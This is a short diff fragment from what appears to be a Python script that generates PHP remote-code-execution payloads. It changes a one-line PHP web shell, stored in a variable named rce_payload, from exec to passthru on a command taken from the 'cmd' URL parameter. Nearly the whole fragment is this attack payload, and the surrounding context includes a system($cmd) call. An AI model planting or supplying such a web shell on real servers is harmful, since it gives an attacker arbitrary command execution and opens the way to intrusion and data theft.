@@ -118,7 +118,7 @@ system($cmd);
 ?>
 """
 rce_payload = f'''<?php
-echo exec($_GET['cmd']);
+echo passthru($_GET['cmd']);
 ?>'''
 
 # Establish payload based on user choice
